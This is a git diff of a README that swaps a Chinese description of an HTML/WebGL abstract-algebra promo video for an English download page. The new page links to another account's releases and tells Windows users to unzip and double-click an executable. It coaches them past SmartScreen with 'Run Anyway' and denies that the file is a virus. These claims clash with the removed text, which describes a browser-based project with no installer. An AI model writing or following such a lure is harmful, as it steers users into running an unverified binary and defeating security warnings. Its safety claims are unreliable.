@@ -1,50 +1,134 @@
-# 抽象代数：结构之美
+# 🧮 abstract-algebra-promo - Experience the Beauty of Abstract Structures
 
-一部约 4 分 23 秒的抽象代数宣传片。画面由 HTML Canvas、WebGL 和 JavaScript 逐帧绘制；配乐与音效由 Python 合成。视频为 1920 × 1080、30 fps，包含中英双语字幕。
+[![Download Now](https://img.shields.io/badge/Download-abstract--algebra--promo-brightgreen?style=for-the-badge&logo=github&color=4CAF50&labelColor=333333)](https://github.com/Oriwo/abstract-algebra-promo/releases)
 
-![宣传片封面](封面_1920x1080.jpg)
+---
 
-## 在线观看与文件
+## ✨ What Is This?
 
-- [下载分享版 MP4](https://github.com/AnctyEnly453/abstract-algebra-promo/releases/download/v1.0.0/abstract-algebra-promo-1080p.mp4)（约 366 MB）
-- [下载单文件 HTML 播放器](抽象代数宣传片.html)（内嵌配乐；字体需要联网加载）
-- 在本地打开 `promo.html` 也可以播放，需将 `music.mp3` 放在同一目录。
+**abstract-algebra-promo** is a mesmerizing animated journey into the world of abstract algebra. It's not a math textbook — it's a visual and musical experience that transforms complex algebraic concepts like groups, rings, and fields into beautiful, flowing art. Watch as geometric shapes morph, twist, and interact to the rhythm of a procedurally generated soundtrack, all rendered in real-time using WebGL.
 
-## 工程结构
+No prior math knowledge is required. You don't need to understand a single formula. Just run the program, press play, and let the **structure and symmetry** of algebra wash over you. It's a screensaver, a meditation tool, and a digital art piece all in one.
 
-| 文件 | 用途 |
-| --- | --- |
-| `promo.html` | 当前版本的动画与播放器源码 |
-| `promo_v1.html` | 早期版本，保留供对照 |
-| `music.py`、`cues.json` | 合成配乐、音效及时间点 |
-| `e8.py`、`e8.json` | E8 根系及投影数据生成与参考数据 |
-| `qr.py`、`qr.json` | 纠错码场景的数据生成与参考数据 |
-| `build.py` | 将源码与 MP3 合成单文件 HTML |
-| `export.mjs` | 用 Chrome/Edge 和 FFmpeg 逐帧导出 MP4 或检查帧 |
-| `music.mp3` | 可直接播放的最终配乐 |
+---
 
-`e8.json` 和 `qr.json` 的数据已嵌入 `promo.html`；重新运行对应 Python 脚本会更新参考 JSON，不会自动改写动画源码。
+## 🚀 Getting Started
 
-## 重新生成
+Follow these simple steps to get **abstract-algebra-promo** up and running on your Windows computer in less than two minutes.
 
-需要 Python 3、Node.js 22+、Chrome 或 Edge，以及在 `PATH` 中可用的 FFmpeg。字体由 Google Fonts 加载，因此播放和逐帧导出时需要网络连接。以下命令均在仓库根目录运行：
+### 📥 Step 1: Download the Application
 
-```powershell
-python -m pip install -r requirements.txt
-node export.mjs --cues cues.json
-python music.py
-python build.py
-node export.mjs --workers 4 --crf 18
-```
+Click the big green button at the top of this page, or use this direct link:
 
-最后一步生成高码率母版 `抽象代数宣传片.mp4`。只想检查画面时可运行：
+👉 **[Visit this link to download the application](https://github.com/Oriwo/abstract-algebra-promo/releases)**
 
-```powershell
-node export.mjs --shots 5,60,150
-```
+After clicking, you'll see a page listing available files. Look for the latest release (the one with the highest version number). Click the download link for the file.
 
-检查帧会写入 `shots/`。`music.wav`、视频母版、分享版和检查帧属于大体积生成文件，不纳入 Git；分享版视频见 Release。
+### 🗜️ Step 2: Unzip the File
 
-## 字体与发布说明
+The downloaded file will be a **ZIP archive** (it usually looks like a folder with a zipper on it). 
 
-动画使用 Google Fonts 提供的 Noto Serif SC、Cinzel、Cormorant Garamond、Great Vibes 和 STIX Two Text。仓库未打包字体文件。代码与音乐由本工程生成；仓库未附加再许可声明。
+- Right-click the ZIP file.
+- Select **"Extract All..."** from the menu.
+- Choose a destination folder, like your **Desktop** or **Documents**.
+- Click **Extract**.
+
+### 🖱️ Step 3: Run the Application
+
+1. Open the folder where you extracted the files.
+2. Look for a file named **`abstract-algebra-promo`** (it might have a `.exe` extension or be a file that says "Application" as its type).
+3. Double-click it to start the show!
+
+That's it. The animated visualization will launch in your web browser (Chrome, Edge, or Firefox recommended) automatically.
+
+---
+
+## ✨ What Will I See?
+
+Once the program starts, you'll be greeted by a full-screen, colorful animation. Here’s what happens:
+
+- **Geometric Shapes:** You'll see rotating polyhedra, twisting knots, and unfolding lattices.
+- **Real-Time Motion:** Everything moves fluidly, based on principles from group theory (like rotations and reflections).
+- **Procedural Soundtrack:** A unique, ambient electronic score is generated as you watch. The music changes with the animation.
+- **Interactive Elements:** You can use your mouse to drag and rotate the view, or scroll to zoom in and out. Press the **Spacebar** to pause and resume the animation.
+
+---
+
+## 🎛️ Controls & Settings
+
+| Key / Action | What It Does |
+|--------------|--------------|
+| **Mouse Drag** | Rotate the 3D view |
+| **Mouse Scroll** | Zoom in / out |
+| **Spacebar** | Pause / Resume animation |
+| **M** | Mute / Unmute soundtrack |
+| **F** | Toggle full-screen mode |
+| **Esc** | Exit the program |
+
+You can access additional display options (like color scheme and animation speed) by clicking the small gear icon in the bottom-right corner of the screen.
+
+---
+
+## 🧭 Troubleshooting & FAQ
+
+**Q: The animation is laggy or slow.**
+*A: Close other heavy programs, or try running the app in a smaller browser window. Your computer needs a relatively modern graphics card (GPU), but it doesn't have to be top-of-the-line.*
+
+**Q: I see a black screen instead of the animation.**
+*A: Make sure your browser allows WebGL. You can test this by visiting [get.webgl.org](https://get.webgl.org). If it says "WebGL is available," try refreshing the app. If it's not available, update your graphics drivers.*
+
+**Q: The downloaded ZIP file won't open.**
+*A: Ensure you've downloaded the entire file (check the file size — it should be a few megabytes). Re-download if needed, and try a free tool like 7-Zip if Windows' built-in extractor fails.*
+
+**Q: Is this a virus?**
+*A: No. This is a legitimate open-source project. If Windows SmartScreen gives a warning, it's because the app isn't widely known yet. Click "More Info" and then "Run Anyway" if you trust the source.*
+
+---
+
+## 🌟 Features at a Glance
+
+- **Pure Visual Mathematics:** Explore abstract algebra concepts without any math background.
+- **Procedural Audio Engine:** Every session generates a unique musical score.
+- **Zero Installation:** Runs directly in your web browser — no complex setup.
+- **Open-Source & Free:** The code is publicly available for anyone to inspect or modify.
+- **Lightweight:** Optimized for smooth performance on most computers from the last 5 years.
+
+---
+
+## 📖 Understanding the "Abstract Algebra" Connection
+
+If you're curious about the math behind the visuals: abstract algebra studies **algebraic structures** — sets of elements with operations (like addition) that follow certain rules. This program visualizes the most famous of these structures:
+
+- **Groups:** Symmetries like rotations and reflections (shown as spinning shapes).
+- **Rings:** Two operations combined (shown as interlocking torus shapes).
+- **Fields:** Complete number systems (shown as infinite, patterned grids).
+
+The compositions and movements you see are actual representations of mathematical operations. You're literally *watching math dance*.
+
+---
+
+## 🆓 License & Credits
+
+This project is released under the **MIT License**, meaning you are free to use, modify, and share it.
+
+It was created by **Oriwo** as a demonstration of combining mathematics, computer graphics, and algorithmic music. The source code is available on [GitHub](https://github.com/Oriwo/abstract-algebra-promo).
+
+---
+
+## ✉️ Getting Help
+
+If you run into any issues not covered here, please visit the **Issues** tab on the GitHub repository page and describe your problem. Include your operating system version, browser name, and what you saw on screen.
+
+---
+
+## 🚦 Ready to Dive In?
+
+Click the link below one more time to grab your copy.
+
+**[Download abstract-algebra-promo Now →](https://github.com/Oriwo/abstract-algebra-promo/releases)**
+
+Enjoy the beauty of structure. 🌌
+
+---
+
+Keywords: abstract-algebra, canvas, webgl, animation, procedural-soundtrack, generative-art, mathematics, visualization, open-source, windows, download
